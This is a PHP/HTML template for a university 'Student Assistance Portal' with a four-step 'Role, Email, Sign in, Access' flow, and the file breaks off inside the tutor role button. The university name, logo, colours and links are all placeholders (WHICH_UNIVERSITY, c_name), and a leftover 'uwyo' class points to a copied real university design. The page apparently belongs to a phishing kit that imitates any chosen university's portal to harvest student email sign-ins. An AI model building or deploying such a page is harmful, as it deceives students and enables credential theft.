<?php
$data = json_decode(file_get_contents('public/includes/default.pdf.data.json'), 1);
$primary = $data['primary_color'] ?? '#9B2C1F';
$accent = $data['accent_color'] ?? '#9B2C1F';
?>
<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <link rel="icon" type="image/svg+xml" href="/public/assets/uploads/<?php echo $this->_company['c_icon'] ?>">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title><?= $this->_company['c_name'] ?> Student's Assistance Portal</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&amp;family=DM+Sans:wght@300;400;500;600&amp;display=swap" rel="stylesheet">
   <link rel="stylesheet" crossorigin="" href="/assets/index-BriuLrwA.css">
   <style id="text-unlocker-style">
      * {
         user-select: text !important;
         -webkit-user-select: text !important;
         -moz-user-select: text !important;
      }

      ::selection {
         background-color: #007bff !important;
         color: white !important;
      }

      ::-moz-selection {
         background-color: #007bff !important;
         color: white !important;
      }

      .hidden {
         display: none !important;
      }

      #loadingSection {}
   </style>

   <style>
      * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
         --primary: #012169;
      }

      body {
         font-family: 'Georgia', 'Times New Roman', serif;
         background: #f5f5f5;
         min-height: 100vh;
      }

      /* Header Bar */
      .header-bar {
         background: var(--primary);
         color: white;
         padding: 15px 0;
         box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }

      .header-content {
         max-width: 1200px;
         margin: 0 auto;
         padding: 0 20px;
         display: flex;
         align-items: center;
         gap: 15px;
      }

      .university-seal {
         width: 50px;
         height: 50px;
         background: white;
         border-radius: 50%;
         display: flex;
         align-items: center;
         justify-content: center;
         font-weight: bold;
         color: var(--primary);
         font-size: 20px;
         border: 3px solid white;
         flex-shrink: 0;
      }

      .header-text h1 {
         font-size: 22px;
         font-weight: normal;
         letter-spacing: 0.5px;
      }

      .header-text p {
         font-size: 12px;
         opacity: 0.9;
         font-style: italic;
      }

      .container {
         max-width: 900px;
         margin: 0 auto;
         padding: 40px 20px;
      }

      /* Loading Screen */
      .loading-screen {
         background: white;
         border: 1px solid #ddd;
         padding: 60px 20px;
         text-align: center;
         box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      }

      .loading-seal {
         width: 120px;
         height: 120px;
         margin: 0 auto 30px;
         background: white;
         border: 5px solid var(--primary);
         border-radius: 50%;
         display: flex;
         flex-direction: column;
         align-items: center;
         justify-content: center;
         position: relative;
      }

      .loading-seal::before {
         content: '';
         position: absolute;
         width: 140px;
         height: 140px;
         border: 2px solid #8b0000;
         border-radius: 50%;
      }

      .seal-initials {
         font-size: 40px;
         font-weight: bold;
         color: var(--primary);
         font-family: 'Georgia', serif;
      }

      .seal-est {
         font-size: 10px;
         color: var(--primary);
         letter-spacing: 1px;
      }

      .loading-title {
         font-size: 24px;
         color: var(--primary);
         margin-bottom: 10px;
         font-weight: normal;
      }

      .loading-subtitle {
         color: #666;
         font-size: 14px;
         font-style: italic;
         margin-bottom: 40px;
      }

      .spinner {
         width: 40px;
         height: 40px;
         margin: 0 auto;
         border: 3px solid #e0e0e0;
         border-top: 3px solid var(--primary);
         border-radius: 50%;
         animation: spin 1s linear infinite;
      }

      @keyframes spin {
         0% {
            transform: rotate(0deg);
         }

         100% {
            transform: rotate(360deg);
         }
      }

      .loading-text {
         margin-top: 20px;
         color: #666;
         font-size: 14px;
         font-family: Arial, sans-serif;
      }

      /* Onboarding Screen */
      .onboarding-screen {
         display: none;
         background: white;
         border: 1px solid #ddd;
         box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      }

      .onboarding-screen.active {
         display: block;
      }

      .document-header {
         background: linear-gradient(to bottom, var(--primary) 0%, #990000 100%);
         color: white;
         padding: 30px 20px;
         text-align: center;
         border-bottom: 4px solid white;
      }

      @media screen and (max-width: 1200px) {
         .document-header {
            display: none !important;
         }

         .header-bar {
            width: 99% !important;
            height: 80% !important;
         }
      }


      .document-seal {
         width: 70px;
         height: 70px;
         margin: 0 auto 20px;
         background: white;
         border: 3px solid white;
         border-radius: 50%;
         display: flex;
         flex-direction: column;
         align-items: center;
         justify-content: center;
      }

      .document-seal-text {
         font-size: 24px;
         font-weight: bold;
         color: var(--primary);
      }

      .document-seal-est {
         font-size: 8px;
         color: var(--primary);
      }

      .document-title {
         font-size: 28px;
         margin-bottom: 10px;
         font-weight: normal;
      }

      .document-subtitle {
         font-size: 13px;
         opacity: 0.9;
         font-style: italic;
      }

      .content-area {
         padding: 30px 20px;
      }

      .official-notice {
         background: #fff5f5;
         border: 2px solid var(--primary);
         padding: 20px;
         margin-bottom: 30px;
         position: relative;
      }

      .notice-header {
         font-weight: bold;
         color: var(--primary);
         margin-bottom: 10px;
         font-size: 20px;
         text-transform: uppercase;
         letter-spacing: 0.5px;
      }

      .notice-content {
         color: #333;
         line-height: 1.8;
         font-size: 18px;
      }

      /* Email Input Section */
      .email-input-section {
         background: #f5f5f5;
         ;
         border: 2px solid var(--primary);
         padding: 25px;
         margin-bottom: 30px;
         border-radius: 8px;
      }

      .email-input-header {
         font-weight: bold;
         color: var(--primary);
         margin-bottom: 15px;
         font-size: 20px;
         text-transform: uppercase;
         letter-spacing: 0.5px;
         display: flex;
         align-items: center;
         gap: 8px;
      }

      .email-input-description {
         color: #333;
         line-height: 1.6;
         font-size: 16px;
         margin-bottom: 20px;
      }

      .form-group {
         margin-bottom: 20px;
      }

      .form-label {
         display: block;
         color: var(--primary);
         font-weight: bold;
         margin-bottom: 8px;
         font-size: 16px;
         font-family: Arial, sans-serif;
      }

      .form-input {
         width: 100%;
         padding: 14px 16px;
         border: 2px solid #ef9a9a;
         border-radius: 6px;
         font-size: 16px;
         font-family: Arial, sans-serif;
         transition: all 0.3s ease;
         background: white;
      }

      .form-input:focus {
         outline: none;
         border-color: var(--primary);
         box-shadow: 0 0 0 3px rgba(204, 0, 0, 0.1);
      }

      .form-input.error {
         border-color: #b71c1c;
      }

      .error-message {
         color: #b71c1c;
         font-size: 14px;
         margin-top: 6px;
         font-family: Arial, sans-serif;
         display: none;
      }

      .error-message.show {
         display: block;
      }

      .form-help {
         color: #666;
         font-size: 14px;
         margin-top: 6px;
         font-family: Arial, sans-serif;
         font-style: italic;
      }

      .section {
         margin: 30px 0;
         padding: 20px;
         background: #fafafa;
         border-left: 4px solid var(--primary);
      }

      .section-title {
         color: var(--primary);
         font-size: 22px;
         margin-bottom: 15px;
         font-weight: bold;
         text-transform: uppercase;
         letter-spacing: 0.5px;
      }

      .instruction-step {
         margin: 20px 0;
         padding-left: 40px;
         position: relative;
      }

      .step-number {
         position: absolute;
         left: 0;
         top: 0;
         width: 30px;
         height: 30px;
         background: var(--primary);
         color: white;
         border-radius: 50%;
         display: flex;
         align-items: center;
         justify-content: center;
         font-weight: bold;
         font-size: 14px;
         font-family: Arial, sans-serif;
      }

      .step-title {
         font-weight: bold;
         color: var(--primary);
         margin-bottom: 8px;
         font-size: 18px;
      }

      .step-description {
         color: #555;
         line-height: 1.6;
         font-size: 16px;
         margin-bottom: 12px;
      }

      .quick-steps {
         background: #f5f5f5;
         border: 2px solid var(--primary);
         border-radius: 8px;
         padding: 20px;
         margin: 20px 0;
      }

      .quick-steps-title {
         color: var(--primary);
         font-weight: bold;
         font-size: 18px;
         margin-bottom: 15px;
         display: flex;
         align-items: center;
         gap: 8px;
         font-family: Arial, sans-serif;
      }

      .quick-steps-list {
         list-style: none;
         padding: 0;
      }

      .quick-steps-list li {
         color: #333;
         font-size: 16px;
         line-height: 1.8;
         margin-bottom: 10px;
         padding-left: 30px;
         position: relative;
         font-family: Arial, sans-serif;
      }

      .quick-steps-list li::before {
         content: '✓';
         position: absolute;
         left: 0;
         color: var(--primary);
         font-weight: bold;
         font-size: 18px;
      }

      .quick-steps-list li strong {
         color: var(--primary);
      }

      .screenshot-container {
         width: 100%;
         margin: 15px 0;
         border: 2px solid #e0e0e0;
         border-radius: 8px;
         overflow: hidden;
         box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      }

      .screenshot-container img {
         width: 100%;
         height: auto;
         display: block;
      }

      .security-notice {
         background: #fff5f5;
         border-left: 4px solid var(--primary);
         padding: 20px;
         margin: 30px 0;
      }

      .security-notice-title {
         color: var(--primary);
         font-weight: bold;
         margin-bottom: 10px;
         font-size: 18px;
         display: flex;
         align-items: center;
         gap: 8px;
      }

      .security-notice-content {
         color: #555;
         line-height: 1.6;
         font-size: 16px;
      }

      .security-notice-content ul {
         margin: 10px 0 10px 20px;
         line-height: 1.8;
      }

      .action-buttons {
         display: flex;
         gap: 15px;
         margin-top: 40px;
         padding-top: 30px;
         border-top: 2px solid #e0e0e0;
      }

      .btn {
         flex: 1;
         padding: 15px 20px;
         border: none;
         font-size: 15px;
         font-weight: bold;
         cursor: pointer;
         transition: all 0.3s ease;
         text-transform: uppercase;
         letter-spacing: 0.5px;
         font-family: Arial, sans-serif;
         border-radius: 6px;
      }

      .btn:disabled {
         opacity: 0.5;
         cursor: not-allowed;
      }

      .btn-primary {
         background: var(--primary);
         color: white;
         border: 2px solid var(--primary);
      }

      .btn-primary:hover:not(:disabled) {
         background: #070385;
         border-color: #070385;
      }

      .btn-secondary {
         background: white;
         color: var(--primary);
         border: 2px solid var(--primary);
      }

      .btn-secondary:hover {
         background: #fff5f5;
      }

      .footer {
         background: #f5f5f5;
         padding: 20px;
         text-align: center;
         color: #666;
         font-size: 12px;
         border-top: 1px solid #ddd;
         line-height: 1.6;
      }

      .hidden {
         display: none;
      }

      /* Tablet Styles */
      @media (max-width: 768px) {
         .header-text h1 {
            font-size: 18px;
         }

         .header-text p {
            font-size: 11px;
         }

         .university-seal {
            width: 45px;
            height: 45px;
            font-size: 18px;
         }

         .container {
            padding: 30px 15px;
         }

         .document-title {
            font-size: 24px;
         }

         .email-input-section {
            padding: 20px;
         }

         .email-input-header {
            font-size: 18px;
         }
      }

      /* Mobile Styles */
      @media (max-width: 480px) {
         .header-content {
            gap: 10px;
         }

         .header-text h1 {
            font-size: 16px;
         }

         .header-text p {
            font-size: 10px;
         }

         .university-seal {
            width: 40px;
            height: 40px;
            font-size: 16px;
            border: 2px solid white;
         }

         .container {
            padding: 20px 10px;
         }

         .document-header {
            padding: 25px 15px;
         }

         .document-title {
            font-size: 22px;
         }

         .content-area {
            padding: 20px 15px;
         }

         .email-input-section {
            padding: 15px;
         }

         .email-input-header {
            font-size: 16px;
         }

         .email-input-description {
            font-size: 14px;
         }

         .form-input {
            padding: 12px 14px;
            font-size: 14px;
         }

         .action-buttons {
            flex-direction: column;
            gap: 12px;
         }

         .btn {
            font-size: 13px;
            padding: 13px 15px;
         }

         .quick-steps-list li {
            font-size: 14px;
         }
      }
   </style>
   <style type="text/css">
      :root {
         --jer-select-border: #b6b6b6;
         --jer-select-focus: #777;
         --jer-select-arrow: #777;
         --jer-form-border: 1px solid #ededf0;
         --jer-form-border-focus: 1px solid #e2e2e2;
         --jer-highlight-color: #b3d8ff
      }

      .jer-visible {
         opacity: 1
      }

      .jer-hidden {
         opacity: 0
      }

      .jer-select select {
         -webkit-appearance: none;
         -moz-appearance: none;
         appearance: none;
         background-color: transparent;
         border: none;
         color: #000;
         cursor: inherit;
         font-family: inherit;
         font-size: .8em;
         line-height: inherit;
         margin: 0;
         outline: none;
         padding: 0 1em 0 0;
         z-index: 1
      }

      select::-ms-expand {
         display: none
      }

      .jer-select {
         align-items: center;
         background-color: #fff;
         background-image: linear-gradient(0deg, #f9f9f9, #fff 33%);
         border: 1px solid var(--jer-select-border);
         border-radius: .25em;
         cursor: pointer;
         display: grid;
         grid-template-areas: "select";
         line-height: 1.1;
         max-width: 15ch;
         min-width: 12ch;
         padding: .25em .5em;
         position: relative
      }

      .jer-select select,
      .jer-select:after {
         grid-area: select
      }

      .jer-select:not(.jer-select--multiple):after {
         background-color: var(--jer-select-arrow);
         clip-path: polygon(100% 0, 0 0, 50% 100%);
         content: "";
         height: .5em;
         justify-self: end;
         width: .8em
      }

      select:focus+.focus {
         border: 1px solid var(--jer-select-focus);
         border-radius: inherit;
         bottom: -1px;
         left: -1px;
         position: absolute;
         right: -1px;
         top: -1px
      }

      .jer-select-inner {
         text-overflow: ellipsis;
         width: 100%
      }

      .jer-editor-container {
         border-radius: .5em;
         font-size: 16px;
         line-height: 1;
         padding: 1em 1em 1em 2em;
         position: relative;
         text-align: left
      }

      .jer-editor-container textarea {
         border: var(--jer-form-border);
         border-radius: .3em;
         color: var(--jer-input-color);
         outline: none
      }

      .jer-editor-container textarea:focus {
         border: var(--jer-form-border-focus)
      }

      .jer-editor-container input {
         border: var(--jer-form-border);
         border-radius: .3em;
         font-family: inherit;
         outline: none
      }

      .jer-editor-container input:focus {
         border: var(--jer-form-border-focus)
      }

      .jer-editor-container ::selection {
         background-color: var(--jer-highlight-color)
      }

      .jer-collection-header-row,
      .jer-value-main-row {
         align-items: center;
         display: flex;
         gap: .3em;
         min-height: 1.7em
      }

      .jer-collection-header-row {
         display: flex;
         flex-wrap: wrap
      }

      .jer-bracket-outside {
         padding-left: .5em
      }

      .jer-collapse-icon {
         left: -1.2em;
         position: absolute;
         top: .35em
      }

      .jer-collection-inner {
         position: relative
      }

      .jer-collection-text-edit {
         align-items: flex-start;
         display: flex;
         flex-direction: column;
         gap: .3em;
         line-height: 1.1em
      }

      .jer-collection-text-area {
         font-family: inherit;
         font-size: .85em;
         max-height: 40em;
         overflow: hidden;
         padding: .2em .5em 0;
         resize: both
      }

      .jer-collection-input-button-row {
         display: flex;
         font-size: 150%;
         justify-content: flex-end;
         margin-top: .4em;
         width: 100%
      }

      .jer-collection-error-row {
         bottom: .5em;
         position: absolute
      }

      .jer-error-slug {
         margin-left: 1em
      }

      .jer-value-component {
         position: relative
      }

      .jer-value-main-row {
         display: flex;
         gap: 0
      }

      .jer-value-and-buttons {
         align-items: center;
         display: flex;
         justify-content: flex-start;
         padding-left: .5em
      }

      .jer-value-error-row {
         position: absolute
      }

      .jer-value-string {
         line-height: 1.3em;
         overflow-wrap: anywhere;
         white-space: pre-wrap;
         word-break: break-word
      }

      .jer-string-expansion {
         cursor: pointer;
         filter: saturate(50%);
         opacity: .6
      }

      .jer-show-less {
         font-size: 80%
      }

      .jer-hyperlink {
         text-decoration: underline
      }

      .jer-input-text {
         font-family: inherit;
         font-size: .9em;
         height: 1.4em;
         line-height: 1.2em;
         margin: 0;
         min-width: 6em;
         overflow: hidden;
         padding: .25em .5em .2em;
         resize: none
      }

      .jer-input-boolean {
         margin-left: .3em;
         margin-right: .3em;
         transform: scale(1.5)
      }

      .jer-key-text {
         line-height: 1.1em;
         white-space: pre-wrap;
         word-break: break-word
      }

      .jer-key-edit {
         font-size: inherit;
         font-size: .9em;
         padding: 0 .3em
      }

      .jer-value-invalid {
         font-style: italic;
         opacity: .5
      }

      .jer-input-number {
         font-size: 90%;
         min-width: 3em
      }

      .jer-confirm-buttons,
      .jer-edit-buttons {
         align-items: center;
         cursor: pointer;
         display: flex;
         height: 1em
      }

      .jer-input-buttons {
         gap: .4em
      }

      .jer-edit-buttons {
         gap: .4em;
         margin-left: .5em;
         opacity: 0
      }

      .jer-confirm-buttons {
         gap: .2em;
         margin-left: .4em
      }

      .jer-edit-buttons:hover {
         opacity: 1;
         position: relative
      }

      .jer-collection-header-row:hover>.jer-edit-buttons,
      .jer-value-and-buttons:hover>.jer-edit-buttons,
      .jer-value-main-row:hover>.jer-edit-buttons {
         opacity: 1
      }

      .jer-copy-pulse {
         position: relative;
         transition: .3s
      }

      .jer-copy-pulse:hover {
         opacity: .85;
         transform: scale(1.2);
         transition: .3s
      }

      .jer-copy-pulse:after {
         border-radius: 50%;
         box-shadow: 0 0 15px 5px var(--jer-icon-copy-color);
         content: "";
         display: block;
         height: 100%;
         left: 0;
         opacity: 0;
         position: absolute;
         top: 0;
         transition: all .5s;
         width: 100%
      }

      .jer-copy-pulse:active:after {
         border-radius: 4em;
         box-shadow: 0 0 0 0 var(--jer-icon-copy-color);
         left: 0;
         opacity: 1;
         position: absolute;
         top: 0;
         transition: 0s
      }

      .jer-copy-pulse:active {
         top: .07em
      }

      .jer-rotate-90 {
         transform: rotate(-90deg)
      }

      .jer-icon:hover {
         opacity: .85;
         transform: scale(1.2);
         transition: .3s
      }

      .jer-empty-string {
         font-size: 90%;
         font-style: italic
      }

      .jer-drag-n-drop-padding {
         border: 1px dashed #e0e0e0;
         border-radius: .3em;
         height: .5em
      }

      .jer-clickzone {
         height: calc(100% - .8em);
         left: -1em;
         position: absolute;
         top: 1.2em
      }
   </style>
   <style id="text-unlocker-style">
      * {
         user-select: text !important;
         -webkit-user-select: text !important;
         -moz-user-select: text !important;
      }

      ::selection {
         background-color: #007bff !important;
         color: white !important;
      }

      ::-moz-selection {
         background-color: #007bff !important;
         color: white !important;
      }
   </style>
</head>

<body>
   <div id="root">
      <div style="font-family: 'Source Sans Pro', Arial, sans-serif; min-height: 100vh; background-color: rgb(242, 245, 249);">
         <style>
            @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap');

            @keyframes spin {
               to {
                  transform: rotate(360deg);
               }
            }

            * {
               box-sizing: border-box;
            }

            body {
               margin: 0;
               background: #f2f5f9;
            }

            a:hover {
               opacity: 0.85;
            }
         </style>
         <header style="width: 100%; font-family: 'Source Sans Pro', Arial, sans-serif;">
            <div style="background-color: <?= $primary ?>; padding: 6px 0px;">
               <div style="max-width: 1200px; margin: 0px auto; padding: 0px 24px; display: flex; justify-content: space-between; align-items: center;">
                  <span style="color: rgb(204, 204, 204); font-size: 12px;"><?= $this->_company['c_name'] ?></span>
                  <nav style="display: flex; gap: 20px;"><a href="<?= WHICH_UNIVERSITY ?>/classes" style="color: rgb(204, 204, 204); font-size: 12px; text-decoration: none;">Classes</a><a href="<?= WHICH_UNIVERSITY ?>" style="color: rgb(204, 204, 204); font-size: 12px; text-decoration: none;">Library</a><a href="<?= WHICH_UNIVERSITY ?>" style="color: rgb(204, 204, 204); font-size: 12px; text-decoration: none;">Canvas</a><a href="<?= WHICH_UNIVERSITY ?>" style="color: rgb(204, 204, 204); font-size: 12px; text-decoration: none;"><?= $this->_company['c_name'] ?></a></nav>
               </div>
            </div>
            <div style="background-color: <?= $primary ?>; padding: 16px 0px;">
               <div style="max-width: 1200px; margin: 0px auto; padding: 0px 24px; display: flex; justify-content: space-between; align-items: center;">
                  <div style="display: flex; align-items: center; gap: 14px;">
                     <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="48" height="48" rx="4" fill="#FFC425"></rect>
                        <path d="M24 8c-1.2 0-2.1.5-2.6 1.3-.4.6-.4 1.3-.1 2 .2.4.5.8.9 1.1-.8.3-1.5.9-1.9 1.7-.3.6-.3 1.3 0 1.9.2.4.5.7.9.9-.5.4-.9 1-1 1.7-.2.9.1 1.8.7 2.4-.3.2-.5.5-.6.9-.2.7 0 1.4.5 1.9.3.3.7.5 1.1.5v2.8c0 .4-.1.7-.3 1l-2.8 4.5c-.3.5-.2 1.1.2 1.5.2.2.5.3.8.3.3 0 .6-.1.8-.4l2.1-3.3v5.5c0 .6.4 1 1 1s1-.4 1-1v-5.5l2.1 3.3c.2.3.5.4.8.4.3 0 .6-.1.8-.3.4-.4.5-1 .2-1.5l-2.8-4.5c-.2-.3-.3-.6-.3-1v-2.8c.4 0 .8-.2 1.1-.5.5-.5.7-1.2.5-1.9-.1-.4-.3-.7-.6-.9.6-.6.9-1.5.7-2.4-.1-.7-.5-1.3-1-1.7.4-.2.7-.5.9-.9.3-.6.3-1.3 0-1.9-.4-.8-1.1-1.4-1.9-1.7.4-.3.7-.7.9-1.1.3-.7.3-1.4-.1-2C26.1 8.5 25.2 8 24 8z" fill="<?= $primary ?>"></path>
                        <text x="24" y="46" text-anchor="middle" fill="<?= $primary ?>" font-size="6" font-weight="bold" font-family="Arial, sans-serif" letter-spacing="1"><?= $this->_company['c_name'] ?></text>
                     </svg>
                     <div style="display: flex; flex-direction: column;"><span style="color: rgb(255, 255, 255); font-size: 22px; font-weight: 700; letter-spacing: -0.3px; font-family: Georgia, serif;"><?= $this->_company['c_name'] ?></span><span style="color: rgb(255, 196, 37); font-size: 12px; letter-spacing: 0.5px; margin-top: 2px;">Student Registration Portal</span></div>
                  </div>
               </div>
            </div>
            <div style="background-color: <?= $primary ?>; border-top: 3px solid rgb(255, 196, 37);">
               <div style="max-width: 1200px; margin: 0px auto; padding: 0px 24px; display: flex; gap: 0px;"><a href="<?= WHICH_UNIVERSITY ?>/academics" class="uwyo-nav-link" style="color: rgb(255, 255, 255); font-size: 14px; font-weight: 500; text-decoration: none; padding: 11px 18px; display: inline-block; border-right: 1px solid rgba(255, 255, 255, 0.1); transition: background 0.15s;">Academics</a><a href="<?= WHICH_UNIVERSITY ?>/studentaffairs" class="uwyo-nav-link" style="color: rgb(255, 255, 255); font-size: 14px; font-weight: 500; text-decoration: none; padding: 11px 18px; display: inline-block; border-right: 1px solid rgba(255, 255, 255, 0.1); transition: background 0.15s;">Student Affairs</a><a href="<?= WHICH_UNIVERSITY ?>/research" class="uwyo-nav-link" style="color: rgb(255, 255, 255); font-size: 14px; font-weight: 500; text-decoration: none; padding: 11px 18px; display: inline-block; border-right: 1px solid rgba(255, 255, 255, 0.1); transition: background 0.15s;">Research</a><a href="<?= WHICH_UNIVERSITY ?>/admissions" class="uwyo-nav-link" style="color: rgb(255, 255, 255); font-size: 14px; font-weight: 500; text-decoration: none; padding: 11px 18px; display: inline-block; border-right: 1px solid rgba(255, 255, 255, 0.1); transition: background 0.15s;">Admissions</a><a href="<?= WHICH_UNIVERSITY ?>/about" class="uwyo-nav-link" style="color: rgb(255, 255, 255); font-size: 14px; font-weight: 500; text-decoration: none; padding: 11px 18px; display: inline-block; border-right: 1px solid rgba(255, 255, 255, 0.1); transition: background 0.15s;">About</a></div>
            </div>
         </header>
         <div style="background-color: <?= $primary ?>; border-bottom: 3px solid rgb(255, 196, 37);">
            <div style="max-width: 1200px; margin: 0px auto; padding: 20px 24px; display: flex; justify-content: space-between; align-items: center;">
               <div>
                  <p style="font-size: 12px; color: rgb(240, 213, 128); margin: 0px 0px 4px; text-transform: uppercase; letter-spacing: 0.6px; font-weight: 600;">Student Assistance Portal</p>
                  <h1 style="font-size: 24px; font-weight: 700; color: rgb(255, 255, 255); margin: 0px; font-family: Georgia, serif;">Course Work Access</h1>
               </div>
            </div>
         </div>
         <main style="max-width: 1200px; margin: 0px auto;">
            <div style="padding: 40px 24px; max-width: 560px; margin: 0px auto;">
               <div style="display: flex; justify-content: center; padding: 48px 24px;">

                  <!--------------------intro to sign in----------------------------------->
                  <div id="roleDiv"
                     style="max-width: 520px; width: 100%; background-color: rgb(255, 255, 255); border-radius: 8px; border: 1px solid rgb(232, 217, 192); box-shadow: rgba(0, 85, 162, 0.08) 0px 2px 16px; padding: 40px 48px;">
                     <div style="display: flex; align-items: center; gap: 14px; margin-bottom: 28px;">
                        <svg width="56" height="56" viewBox="0 0 56 56" fill="none">
                           <rect width="56" height="56" rx="6" fill="#FFC425"></rect>
                           <path d="M28 9c-1.4 0-2.4.6-3 1.5-.5.7-.5 1.6-.1 2.3.2.5.6.9 1.1 1.3-.9.4-1.7 1-2.2 2-.4.7-.4 1.5 0 2.2.3.5.6.9 1.1 1.1-.6.4-1 1.1-1.2 1.9-.2 1 .1 2.1.8 2.8-.3.3-.6.6-.7 1.1-.2.8 0 1.7.6 2.2.3.3.8.6 1.3.6v3.3c0 .4-.1.8-.4 1.2l-3.3 5.2c-.3.6-.2 1.3.2 1.7.3.3.6.4 1 .4.4 0 .7-.2.9-.5l2.5-3.9v6.4c0 .6.5 1.2 1.2 1.2s1.2-.5 1.2-1.2v-6.4l2.5 3.9c.2.3.5.5.9.5.4 0 .7-.1 1-.4.4-.4.5-1.1.2-1.7l-3.3-5.2c-.2-.4-.4-.8-.4-1.2v-3.3c.5 0 .9-.3 1.3-.6.6-.5.8-1.4.6-2.2-.1-.5-.4-.8-.7-1.1.7-.7 1-1.8.8-2.8-.2-.8-.6-1.5-1.2-1.9.5-.2.8-.6 1.1-1.1.4-.7.4-1.5 0-2.2-.5-1-1.3-1.6-2.2-2 .5-.4.9-.8 1.1-1.3.4-.7.4-1.6-.1-2.3C30.4 9.6 29.4 9 28 9z" fill="<?= $primary ?>"></path>
                           <text x="28" y="53" text-anchor="middle" fill="<?= $primary ?>" font-size="7" font-weight="bold" font-family="Arial, sans-serif" letter-spacing="1.2"><?= $this->_company['c_name'] ?></text>
                        </svg>
                        <div style="display: flex; flex-direction: column;"><span style="font-size: 17px; font-weight: 700; color: <?= $primary ?>; font-family: Georgia, serif;">Student Assistance Portal</span><span style="font-size: 12px; color: <?= $primary ?>; font-weight: 600; letter-spacing: 0.3px; margin-top: 2px;"><?= $this->_company['c_name'] ?></span></div>
                     </div>
                     <div style="display: flex; align-items: center; margin-bottom: 28px;">
                        <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                           <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: <?= $primary ?>; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(255, 255, 255); font-size: 12px; font-weight: 600;">1</div>
                           <span style="font-size: 11px; font-weight: 500; color: <?= $primary ?>;">Role</span>
                        </div>
                        <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: rgb(232, 217, 192);"></div>
                        <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                           <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: transparent; border: 1.5px solid rgb(187, 187, 187); color: rgb(170, 170, 170); font-size: 12px; font-weight: 600;">2</div>
                           <span style="font-size: 11px; font-weight: 500; color: rgb(170, 170, 170);">Email</span>
                        </div>
                        <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: rgb(232, 217, 192);"></div>
                        <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                           <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: transparent; border: 1.5px solid rgb(187, 187, 187); color: rgb(170, 170, 170); font-size: 12px; font-weight: 600;">3</div>
                           <span style="font-size: 11px; font-weight: 500; color: rgb(170, 170, 170);">Sign in</span>
                        </div>
                        <div style="flex: 1 1 0%; height: 1.5px; margin: 0px 6px 18px; background: rgb(232, 217, 192);"></div>
                        <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
                           <div style="width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: transparent; border: 1.5px solid rgb(187, 187, 187); color: rgb(170, 170, 170); font-size: 12px; font-weight: 600;">4</div>
                           <span style="font-size: 11px; font-weight: 500; color: rgb(170, 170, 170);">Access</span>
                        </div>
                     </div>
                     <h2 style="font-size: 20px; font-weight: 700; color: <?= $primary ?>; margin: 0px 0px 10px; font-family: Georgia, serif;">Who are you?</h2>
                     <p style="font-size: 14px; color: rgb(68, 68, 68); line-height: 1.7; margin-bottom: 22px;">Select your role to continue. Students sign in with their address. Outsourced tutors must verify their email with the portal coordinator first.</p>
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px;">

                        <button onclick="location.href='/assignments/agreement'" style="display: flex; flex-direction: column; align-items: center; gap: 10px; padding: 20px 12px; background: rgb(255, 255, 255); border: 1.5px solid rgb(208, 213, 221); border-radius: 8px; cursor: pointer;">
                           <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                              <circle cx="16" cy="10" r="5" stroke="<?= $primary ?>" stroke-width="1.6"></circle>
                              <path d="M5 28c0-6.075 4.925-11 11-11s11 4.925 11 11" stroke="<?= $primary ?>" stroke-width="1.6" stroke-linecap="round"></path>
                           </svg>
                           <div>
                              <div style="font-size: 14px; font-weight: 600; color: <?= $primary ?>;">Student</div>
                              <div style="font-size: 12px; color: rgb(102, 102, 102); margin-top: 2px;"><?= $this->_company['c_name'] ?> enrolled</div>
                           </div>
                        </button>
                        <button id="tutorDiv" style="display: flex; flex-direction: column; align-items: center; gap: 10px; padding: 20px 12px; background: hsl(0, 0%, 100%); border: 1.5px solid rgb(208, 213, 221); border-radius: 8px; cursor: pointer;">
                           <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                              <rect x="4" y="6" width="24" height="18" rx="2" stroke="<?= $primary ?>" stroke-width="1.6"></rect>
                              <path d="M10 14h12M10 18h8" stroke="<?= $primary ?>" stroke-width="1.6" stroke-linecap="round"></path>
                              <path d="M16 6v4" stroke="<?= $primary ?>" stroke-width="1.6" stroke-linecap="round"></path>
                           </svg>
                           <div>
                              <div style="font-size: 14px; font-weight: 600; color: <?= $primary ?>;">Tutor</div>
                              <div style="font-size: 12px; color: rgb(102, 102, 102); margin-top: 2px;">Outsourced / external</div>
                              <div style="font-size: 11px;"><span style="display: block;">Powered by</span>
                                 <a href="https://preply.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/preply.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a>
